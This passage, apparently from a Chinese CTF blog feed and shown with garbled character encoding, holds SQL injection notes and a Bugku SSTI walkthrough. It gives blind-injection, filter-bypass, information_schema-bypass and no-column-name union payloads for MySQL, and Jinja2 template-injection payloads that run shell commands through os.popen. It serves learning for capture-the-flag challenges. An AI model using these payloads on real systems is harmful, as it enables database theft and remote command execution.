<li><p>å¼€å¤´æ²¡æœ‰æ•°å­—çš„å­—ç¬¦ä¸²å’Œé0æ•°å­—è¿›è¡Œæ¯”è¾ƒä¼šä¸ºå‡ï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220428104400.png" /></p></li>
<li><p>å¼€å¤´ä¸ºæ•°å­—çš„å­—ç¬¦ä¸²ä¼šè¢«è½¬ä¸ºå¼€å¤´å‡ ä¸ªæ•°å­—ï¼Œæ‰€ä»¥è¦æƒ³æ¯”è¾ƒç»“æœä¸ºçœŸï¼Œåªéœ€è¦å’Œå¼€å¤´å‡ ä¸ªæ•°å­—è¿›è¡Œæ¯”è¾ƒå³å¯ï¼šï¼ˆä¸‹å›¾ä¸­å¦‚æœå³è¾¹ä¸æ˜¯13ï¼Œåˆ™ä¸ºå‡ï¼‰ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220428105320.png" /></p></li>
<li><p>ä»¥0å¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœå‰å‡ ä¸ªéƒ½æ˜¯æ•°å­—ï¼Œåˆ™çœç•¥å‰é¢çš„0ï¼Œç›´æ¥è½¬ä¸ºæ•°å­—ï¼Œå¦‚ï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220428104446.png" /></p></li>
</ol>
<p>è¿™ä¸PHPä¸­çš„å­—ç¬¦ä¸²å’Œæ•°å­—è¿›è¡Œå¼±ç±»å‹æ¯”è¾ƒæ—¶ä¸€è‡´ã€‚</p>
<h3 id="åˆ¤æ–­å­—æ®µæ˜¯å¦å­˜åœ¨">5.2.2. åˆ¤æ–­å­—æ®µæ˜¯å¦å­˜åœ¨</h3>
<p>å‰æï¼šçŸ¥é“å­—æ®µåã€‚</p>
<p>å‡è®¾ï¼Œæˆ‘ä»¬è¾“å…¥çš„æ˜¯unameå’Œpasswdï¼Œå·²çŸ¥uname=adminï¼Œæˆ‘ä»¬å‡è®¾å¦ä¸€ä¸ªå­—æ®µä¸ºpasswdã€‚æ•…ï¼Œæ„é€ å¦‚ä¸‹payload: <code>uname=admin'-(mid((passwd)from(1))='a')-'&amp;passwd=123</code></p>
<p>åˆ†æä¸€ä¸‹ï¼š<code>mid((passwd)from(1))='a'</code>ï¼Œæœ‰ä¸¤ç§æƒ…å†µï¼Œpasswdå­—æ®µå­˜åœ¨ï¼Œé‚£ä¹ˆè¿™å¥è¯è¿”å›0ã€‚é‚£ä¹ˆæœ€åå¾—åˆ°çš„ç»“æœåº”è¯¥æ˜¯<code>passwd error</code>ï¼›å¦‚æœpasswdä¸å­˜åœ¨ï¼Œé‚£ä¹ˆè¿™å¥è¯è¿”å›é”™è¯¯ï¼Œæœ€åå¾—åˆ°çš„ç»“æœä¸º<code>error</code>ã€‚è¿™æ ·ä¹Ÿå°±åˆ¤æ–­äº†è¯¥å­—æ®µæ˜¯å¦å­˜åœ¨ã€‚</p>
<h3 id="å¾—åˆ°å­—æ®µå†…å®¹">5.2.3. å¾—åˆ°å­—æ®µå†…å®¹</h3>
<p>å‰æï¼šçŸ¥é“å­—æ®µåã€‚</p>
<p>åˆ©ç”¨: <code>uname=admin'-(mid(passwd, 1, 1)='a')-'&amp;passwd=123</code>æ¥åˆ¤æ–­ã€‚</p>
<p>å¦‚æœpasswdå†…å®¹çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸º'a'ï¼Œé‚£ä¹ˆ<code>(mid(passwd, 1, 1)='a')</code>ç»“æœä¸º1ï¼Œä»è€Œå˜æˆ<code>admin'-1-'&amp;passwd=123</code>ï¼Œæœ€åæŸ¥è¯¢è¯­å¥å˜ä¸º<code>sql = select * from user where uname='admin'-1-''</code>ï¼Œå³<code>sql = select * from user where uname=-1</code>ï¼Œåé¢çš„æ¯”è¾ƒä¸€å®šæ˜¯é”™è¯¯çš„ï¼Œæ‰€ä»¥ä¼šè¿”å›<code>uname error</code>ã€‚</p>
<p>å¦‚æœpassedå†…å®¹çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ä¸º'a'ï¼Œé‚£ä¹ˆ<code>(mid(passwd, 1, 1)='a')</code>ç»“æœä¸º0ï¼Œå› æ­¤æœ€åå¾—åˆ°æŸ¥è¯¢è¯­å¥<code>sql = select * from user where uname='admin'-0-''</code>ï¼Œ<code>sql = select * from user where uname=0</code>ï¼Œåé¢çš„æ¯”è¾ƒæ°¸çœŸï¼Œæ‰€ä»¥è¿”å›<code>passwd error</code>ã€‚</p>
<p>åˆ©ç”¨è¿”å›ä¸åŒï¼Œå†™ä¸€ä¸ªè„šæœ¬å»è·å¾—passwdå­—æ®µçš„å†…å®¹ã€‚</p>
<h3 id="ç»•è¿‡forè¿‡æ»¤">5.2.4. ç»•è¿‡forè¿‡æ»¤</h3>
<p>å¦‚æœåœ¨','å’Œç©ºæ ¼éƒ½è¢«è¿‡æ»¤çš„å‰æä¸‹ï¼Œforåˆè¢«è¿‡æ»¤äº†ï¼Œé‚£ä¹ˆè¯¥å¦‚ä½•åšå‘¢ï¼Ÿç­”æ¡ˆæ˜¯ç»“åˆmidå’Œreverseä¸¤ä¸ªå‡½æ•°ï¼Œmidä¹Ÿå¯ä»¥ç”¨substrä»£æ›¿ã€‚</p>
<p>å…ˆç»™payload: <code>mid(REVERSE(MID((passwd)from(k)))from(-1))</code></p>
<ol type="1">
<li>å…ˆçœ‹<code>MID((passwd)from(k))</code>ï¼Œå¾—åˆ°paswdå­—æ®µçš„ä»ç¬¬kä¸ªå­—ç¬¦ï¼ˆåŒ…æ‹¬ç¬¬kä¸ªï¼‰ä¹‹åçš„å…¨éƒ¨å†…å®¹ï¼›å‡è®¾ä¸º(klmnopq)</li>
<li><code>REVERSE(MID((passwd)from(k)))</code>ï¼Œå°†ç¬¬ä¸€æ­¥å¾—åˆ°çš„å­—ä¸²å€’ç½®ï¼›å‡è®¾ä¸º(qponmlk)</li>
<li><code>mid(REVERSE(MID((passwd)from(k)))from(-1))</code>ï¼Œä»å€’ç½®çš„å­—ä¸²ä¸­å–å‡ºæœ€åä¸€ä¸ªå­—ç¬¦ï¼›å–å‡ºk</li>
</ol>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220428112925.png" /></p>
<p>æ ¹æ®ä¸Šè¿°åˆ†æï¼Œæ•´å¥è¯å…¶å®å°±å¹²äº†ä¸€ä»¶äº‹ï¼Œå–å‡ºpasswdå­—æ®µå†…å®¹çš„ç¬¬kä¸ªå­—ç¬¦ï¼Œç­‰ä»·äº<code>mid((passwd)from(k)for1)</code>ã€‚ä¹‹åå¯ä»¥ç”¨æ¥ï¼Œåªè¦æŠŠkä»1å¾ªç¯åˆ°len(passwd)å³å¯ã€‚å½“ç„¶ä¸çŸ¥é“passwdé•¿åº¦ï¼Œéšä¾¿çŒœã€‚</p>
<h2 id="information_schemaç»•è¿‡åŠæ— åˆ—åæ³¨å…¥">5.3. information_schemaç»•è¿‡åŠæ— åˆ—åæ³¨å…¥</h2>
<h3 id="information_schemaç»•è¿‡">5.3.1. information_schemaç»•è¿‡</h3>
<h4 id="é—®é¢˜æè¿°">5.3.1.1. é—®é¢˜æè¿°</h4>
<p><code>information_schema</code>æ˜¯mysqlä¸­å°±æ˜¯ä¸€ä¸ªä¿¡æ¯æ•°æ®åº“ï¼Œä¿å­˜ç€mysqlæœåŠ¡å™¨æ‰€ç»´æŠ¤çš„æ‰€æœ‰å…¶ä»–æ•°æ®åº“çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬äº†æ•°æ®åº“åã€è¡¨åã€å­—æ®µåç­‰ã€‚åœ¨sqlæ³¨å…¥è¿‡ç¨‹ä¸­ï¼Œè¯¥æ•°æ®åº“æœ€å¤§çš„ä½œç”¨å°±æ˜¯è·å¾—<code>table_scheme</code>ï¼Œ<code>table_name</code>ï¼Œ<code>column_name</code>ç­‰ä¿¡æ¯ã€‚</p>
<p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œåå°è¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ï¼Œæ¯”å¦‚è¯´<code>or</code>ï¼Œå¹¶ä¸”æ— æ³•ç»•è¿‡ï¼Œè¿™ä¼šå¯¼è‡´<code>information_schema</code>æ•°æ®åº“æ— æ³•ä½¿ç”¨ï¼Œæ­¤æ—¶å¸¸è§„çš„sqlæ³¨å…¥å·²ç»ä¸èƒ½å¤Ÿç»§ç»­ï¼Œéœ€è¦æ–°çš„æ–¹æ³•ã€‚</p>
<h4 id="è§£å†³åŠæ³•">5.3.1.2. è§£å†³åŠæ³•</h4>
<h5 id="mysql-5.7çš„æ–°ç‰¹æ€§">5.3.1.2.1. mysql 5.7çš„æ–°ç‰¹æ€§</h5>
<p>å‚è€ƒé“¾æ¥ï¼šhttps://www.anquanke.com/post/id/193512</p>
<blockquote>
<p>ç”±äºperformance_schemaè¿‡äºå‘æ‚ï¼Œæ‰€ä»¥mysqlåœ¨5.7ç‰ˆæœ¬ä¸­æ–°å¢äº†sys schemmaï¼ŒåŸºç¡€æ•°æ®æ¥è‡ªäºperformance_chemaå’Œinformation_schemaä¸¤ä¸ªåº“ï¼Œæœ¬èº«æ•°æ®åº“ä¸å­˜å‚¨æ•°æ®ã€‚</p>
</blockquote>
<h6 id="sys.schema_auto_increment_columns">5.3.1.2.1.1. sys.schema_auto_Increment_columns</h6>
<p>ç®€è€Œè¨€ä¹‹ï¼Œè¯¥è§†å›¾çš„ä½œç”¨å°±æ˜¯å¯¹è¡¨<strong>è‡ªå¢ID</strong>çš„ç›‘æ§ã€‚</p>
<p>é€šè¿‡securityï¼ˆsqli-labsï¼‰å’Œfortestï¼ˆè‡ªå»ºåº“ï¼‰ä¸¤ä¸ªåº“æ¥ç†Ÿæ‚‰ä¸€ä¸‹schema_auto_increment_columnsè§†å›¾çš„ç»“æ„ç»„æˆã€ä»¥åŠç‰¹æ€§ã€‚ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">forteståº“ï¼šï¼ˆå‰ä¸¤ä¸ªå­˜åœ¨è‡ªå¢IDï¼‰</span><br><span class="line">	dataè¡¨</span><br><span class="line">	testè¡¨</span><br><span class="line">	no_a_i_tableè¡¨</span><br><span class="line">securityåº“ï¼š</span><br><span class="line">	emails, referers, uagents, users</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413094801.png" /></p>
<p>å¯ä»¥å‘ç°<code>no_a_i_table</code>å¹¶æ²¡æœ‰åœ¨è¿™é‡Œæ˜¾ç¤ºå‡ºæ¥ï¼Œç„¶åç³»ç»Ÿè‡ªå¸¦çš„åº“ä¸­çš„è¡¨ä¿¡æ¯å…¨éƒ¨ç°å®ã€‚ä»è¿™é‡Œå¯ä»¥çœ‹å‡ºï¼Œå¦‚æœæ•°æ®åº“ä¸­çš„è¡¨å­˜åœ¨<strong>è‡ªå¢ID</strong>ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨<code>sys.schema_auto_Increment_columns</code>è§†å›¾æ¥ä»£æ›¿<code>indormation_schema</code>è·å¾—æ•°æ®åº“ä¸­çš„è¡¨åä¿¡æ¯ã€‚</p>
<h6 id="schema_table_statistics_with_buffer-xschema_table_statistics_with_bufferç­‰">5.3.1.2.1.2. schema_table_statistics_with_buffer ,x$schema_table_statistics_with_bufferç­‰</h6>
<blockquote>
<p>æŸ¥è¯¢è¡¨çš„ç»Ÿè®¡ä¿¡æ¯ï¼Œå…¶ä¸­è¿˜åŒ…æ‹¬InnoDBç¼“å†²æ± ç»Ÿè®¡ä¿¡æ¯ï¼Œé»˜è®¤æƒ…å†µä¸‹æŒ‰ç…§å¢åˆ æ”¹æŸ¥æ“ä½œçš„æ€»è¡¨I/Oå»¶è¿Ÿæ—¶é—´ï¼ˆæ‰§è¡Œæ—¶é—´ï¼Œå³ä¹Ÿå¯ä»¥ç†è§£ä¸ºæ˜¯å­˜åœ¨æœ€å¤šè¡¨I/Oäº‰ç”¨çš„è¡¨ï¼‰é™åºæ’åºï¼Œæ•°æ®æ¥æºï¼š<code>performance_schema.table_io_waits_summary_by_tableã€sys.x$ps_schema_table_statistics_ioã€sys.x$innodb_buffer_stats_by_table</code></p>
</blockquote>
<p>é€šè¿‡ä»‹ç»çš„å†…å®¹æˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“çš„å‘ç°ï¼Œåˆ©ç”¨â€œæ•°æ®æ¥æºâ€åŒæ ·å¯ä»¥è·å–åˆ°æˆ‘ä»¬éœ€è¦çš„ä¿¡æ¯ï¼Œæ‰€ä»¥è¯´è¿™æ ·çš„è¯æˆ‘ä»¬çš„ç»•è¿‡information_schemaçš„æ€è·¯å°±æ›´å¹¿äº†ã€‚åŠ ä¸‹æ¥ä¾æ¬¡çœ‹ä¸€ä¸‹å„ä¸ªè§†å›¾çš„ç»“æ„ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sys.schema_table_statistics_with_buffer</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413095201.png" /></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨ä¸Šä¸€ä¸ªè§†å›¾ä¸­å¹¶æ²¡æœ‰å‡ºç°çš„è¡¨ååœ¨è¿™é‡Œå‡ºç°äº†ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sys.x$schema_table_statistics_with_buffer</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413095240.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># åœ¨ä»`æ•°æ®æ¥æº`ä¸­éšä¾¿é€‰å–ä¸€ä¸ªè§†å›¾ä¸ºä¾‹ï¼ˆæƒ³æŸ¥çœ‹è§†å›¾è¯¦ç»†ç»“æ„ç­‰ä¿¡æ¯å¯è‡ªè¡Œæµ‹è¯•ï¼‰ </span><br><span class="line"># sys.x$ps_schema_table_statistics_io </span><br><span class="line"># å¯å¿½ç•¥table_name=&#x27;db&#x27;ï¼Œé»˜è®¤çš„ã€‚</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413095352.png" /></p>
<p>è¿˜æœ‰è®¸å¤šç±»ä¼¼çš„è§†å›¾ã€‚</p>
<h6 id="ç»•è¿‡æ–¹æ³•">5.3.1.2.1.3. ç»•è¿‡æ–¹æ³•</h6>
<p>payloadå¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># schema_auto_increment_columns </span><br><span class="line">?id=-1&#x27; union all select 1,2,group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()--+</span><br><span class="line"></span><br><span class="line"># schema_table_statistics_with_buffer </span><br><span class="line">?id=-1&#x27; union all select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+</span><br><span class="line"></span><br><span class="line"># information_schema</span><br><span class="line">?id=-1&#x27; union all select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure></p>
<p>ç¬¬ä¸‰ä¸ªä¸ºä½¿ç”¨<code>information_schema</code>çš„payloadï¼Œä¸‰è€…è¿›è¡Œå¯¹æ¯”ï¼Œå‘ç°å¤§æ¦‚çš„å†…å®¹æ²¡æœ‰æ”¹å˜ï¼Œåªæ˜¯æ”¹å˜äº†<code>information_schema</code>è¿™ä¸ªä½ç½®çš„å†…å®¹ã€‚</p>
<h5 id="mysqlé»˜è®¤å­˜å‚¨å¼•æ“innodbæºå¸¦çš„è¡¨">5.3.1.2.2. mysqlé»˜è®¤å­˜å‚¨å¼•æ“innoDBæºå¸¦çš„è¡¨</h5>
<p>ä»MySQL 5.5.8å¼€å§‹ï¼ŒInnoDBæˆä¸ºå…¶é»˜è®¤å­˜å‚¨å¼•æ“ã€‚è€Œåœ¨MySQL 5.6ä»¥ä¸Šçš„ç‰ˆæœ¬ä¸­ï¼ŒInnoDbå¢åŠ äº†innodb_index_statså’Œinnodb_table_statsä¸¤å¼ è¡¨ï¼Œè¿™ä¸¤å¼ è¡¨ä¸­éƒ½å­˜å‚¨äº†æ•°æ®åº“å’Œå…¶æ•°æ®è¡¨çš„ä¿¡æ¯ï¼Œä½†æ˜¯æ²¡æœ‰å­˜å‚¨åˆ—åã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql.innodb_table_stats</span><br><span class="line">mysql.innodb_index_stats</span><br></pre></td></tr></table></figure>
<p>payloadä¸ä¸Šé¢ç±»ä¼¼ã€‚</p>
<blockquote>
<p>è¿˜å¯ä»¥ä½¿ç”¨innodbç»•è¿‡information_schemaï¼Œä½†æ˜¯MySQLä¸­é»˜è®¤å…³é—­innodbå¼•æ“ã€‚</p>
</blockquote>
<h3 id="æ— åˆ—åæ³¨å…¥">5.3.2. æ— åˆ—åæ³¨å…¥</h3>
<p>å‚è€ƒé“¾æ¥ï¼šhttps://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/</p>
<p>ä¸Šé¢çš„æ–¹æ³•èƒ½å¤Ÿå¾—åˆ°è¡¨åï¼Œç°åœ¨éœ€è¦å¾—åˆ°åˆ—åï¼ˆå­—æ®µåï¼‰ã€‚</p>
<p>å¸¸è§„çš„æŸ¥è¯¢ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413101422.png" /></p>
<p>å¯ä»¥çœ‹åˆ°æœ‰å››ä¸ªå­—æ®µ<code>id</code>, <code>username</code>, <code>password</code>, <code>level</code>ã€‚</p>
<p>ä¸‹ä¸€æ­¥ï¼Œå°†åˆ—åè½¬æ¢ä¸ºä»»ä½•å¯é€‰çš„å·²çŸ¥å€¼ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1,2,3,4 union select * from users;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>è¿™ä¸€æ­¥éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¿…é¡»çŸ¥é“è¯¥è¡¨ä¸­çš„å­—æ®µæ•°ï¼</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413101617.png" /></p>
<p>åˆ—åå·²ç»è½¬æ¢ä¸º1,2,3,4ã€‚ä¸‹ä¸€æ­¥æ˜¯æ ¹æ®æ–°çš„æ•°å€¼é€‰æ‹©æ•°æ®ï¼Œ<strong>å¿…é¡»ç»™è¡¨æ·»åŠ åˆ«åæ‰å¯ä»¥</strong>ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select `3` from (select 1,2,3,4 union select * from users)as alias; </span><br><span class="line">å…¶ä¸­ as å¯ä»¥çœç•¥ä¸å†™</span><br></pre></td></tr></table></figure></p>
<p>ä¸ªäººç†è§£ï¼šå…ˆæ‰§è¡Œäº†<code>(select 1,2,3,4 union select * from users)</code>ï¼Œç„¶åè¿”å›ä¸€å¼ è¡¨ï¼Œå°†è¿™å¼ è¡¨èµ·ä¸ªåˆ«å<code>alias</code>ï¼Œç„¶åå†æ‰§è¡Œ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select `3` from alias</span><br></pre></td></tr></table></figure></p>
<p>ä»<code>alias</code>è¡¨ä¸­é€‰å‡ºåˆ—åä¸º<code>3</code>ï¼Œå¹¶è¿”å›å…¶å†…å®¹ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413101830.png" /></p>
<p>æˆåŠŸå¾—åˆ°åˆ—åä¸º<code>3</code>çš„ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯ä¹‹å‰åˆ—åä¸º<code>password</code>çš„ä¿¡æ¯ã€‚</p>
<p>å¦‚æœåå¼•å·è¢«è¿‡æ»¤ï¼Œé‚£ä¹ˆè¿˜å¯ä»¥é€šè¿‡ç»™å­—æ®µå»åˆ«åçš„æ–¹å¼ç»•è¿‡ã€‚å‘½ä»¤å¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select b from (select 1,2,3 as b,4 union select * from users)alias; </span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413102429.png" /></p>
<p>è¾¾åˆ°åŒæ ·çš„æ•ˆæœã€‚</p>
<p>ç»“åˆæ³¨å…¥çš„payloadï¼ˆç±»ä¼¼ï¼‰ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,(select group_concat(b) from(select 1,2,3 as b,4 union select * from users)alias),3,4--+</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p><code>select * from users</code> ç­‰ä»·äº <code>select*from users;</code></p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413102723.png" /></p>
<h3 id="é¢˜ç›®">5.3.3. é¢˜ç›®</h3>
<p>[[SWPU2019 Web1]]</p>
<h2 id="flagä¸åœ¨å½“å‰æ•°æ®åº“">flagä¸åœ¨å½“å‰æ•°æ®åº“</h2>
<p>å¦‚æœflagåœ¨å½“å‰æ•°æ®åº“ï¼Œä¾æ¬¡æ‰§è¡Œä¸‹è¿°å‘½ä»¤ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ˜¾ç¤ºå½“å‰æ•°æ®åº“ï¼š-1&#x27; union select 1,database()</span><br><span class="line">çˆ†è¡¨åï¼š-1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()</span><br><span class="line">çˆ†åˆ—åï¼š-1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;db_name&#x27; and table_name=&#x27;tb_name&#x27;</span><br><span class="line">å¾—åˆ°åˆ—è¡¨ä¿¡æ¯ï¼š-1&#x27; union select 1,group_concat(cl_name1,cl_name2,...) from da_name.tb_name</span><br></pre></td></tr></table></figure></p>
<p>å¦‚æœä¸åœ¨å½“å‰æ•°æ®åº“ï¼Œåœ¨æ‰§è¡Œä¸Šè¿°å‘½ä»¤æ—¶ï¼Œå…ˆæ‰§è¡Œ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">çˆ†æ•°æ®åº“ï¼ˆæœåŠ¡å™¨å­˜åœ¨çš„æ‰€æœ‰æ•°æ®åº“ï¼‰ï¼š-1&#x27; union select 1,group_concat(schema_name) from information_schema.schemata</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>æ€»ç»“</category>
      </categories>
      <tags>
        <tag>SQLæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku_SSTI_2</title>
    <url>/2022/04/05/bugku_SSTI_2/</url>
    <content><![CDATA[<p>é¢˜ç›®åœ°å€ï¼šhttps://ctf.bugku.com/challenges/detail/id/203.html</p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">1 é¢˜ç›®ä¿¡æ¯</h1>
<p>è¿›å…¥ç¯å¢ƒã€‚å¾—åˆ°æç¤ºä¿¡æ¯ <code>You need pass in a parameter named flag</code>ã€‚åˆå› ä¸ºé¢˜ç›®å¸¦æœ‰SSTIï¼Œæ ¹æ®å†³ç­–æ ‘</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220404145633.png" /></p>
<p>ç›´æ¥å°è¯•å¦‚ä¸‹payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ?flag=$&#123;7*7&#125; # ç»“æœï¼š$&#123;7*7&#125;</span><br><span class="line">2. ?flag=&#123;&#123;7*7&#125;&#125; # ç»“æœï¼š49</span><br><span class="line">3. ?flag=&#123;&#123;7*&#x27;7&#x27;&#125;&#125; # ç»“æœï¼š7777777</span><br></pre></td></tr></table></figure></p>
<p>å› æ­¤åˆ¤æ–­æ¨¡æ¿å¼•æ“æ˜¯Jinjia2æˆ–è€…æ˜¯flaskã€‚</p>
<h1 id="è§£é¢˜">2 è§£é¢˜</h1>
<p>è¾“å…¥å¦‚ä¸‹payloadï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?flag=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>ä»ä¸­æ‰¾å‡ºå¦‚ä¸‹å¯ç”¨çš„å­ç±»ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">75.</span> &lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">_frozen_importlib</span>.<span class="title">_ModuleLock</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">127. &lt;<span class="title">class</span> &#x27;<span class="title">os</span>.<span class="title">_wrap_close</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">128. &lt;<span class="title">class</span> &#x27;<span class="title">_sitebuiltins</span>.<span class="title">Quitter</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">129. &lt;<span class="title">class</span> &#x27;<span class="title">_sitebuiltins</span>.<span class="title">_Printer</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>æ¥ä¸‹æ¥å…±æœ‰4ç§æ–¹æ³•</p>
<ul>
<li><p>æ–¹æ³•1 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p></li>
<li><p>æ–¹æ³•2</p></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ?flag=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>æ–¹æ³•3</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>æ–¹æ³•4 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>?flag=&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat flag&#x27;</span>).read()&#125;&#125; </span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>SSTI</category>
      </categories>
      <tags>
        <tag>Flask</tag>
        <tag>Jinjia2</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku_èªæ˜çš„php</title>
    <url>/2022/04/05/bugku_%E8%81%AA%E6%98%8E%E7%9A%84php/</url>
    <content><![CDATA[<p>é¢˜ç›®åœ°å€ï¼šhttps://ctf.bugku.com/challenges/detail/id/198.html</p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">é¢˜ç›®ä¿¡æ¯</h1>
<p>è¿›å…¥ç¯å¢ƒè·å¾—ä¸€å¥è¯æç¤ºï¼š &gt;pass a parameter and maybe the flag file's filename is random :&gt;</p>
<p>éšä¾¿ç»™ä¸€ä¸ªå‚æ•°ï¼Œå¾—åˆ°å¦‚ä¸‹ç•Œé¢ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405113111.png" /></p>
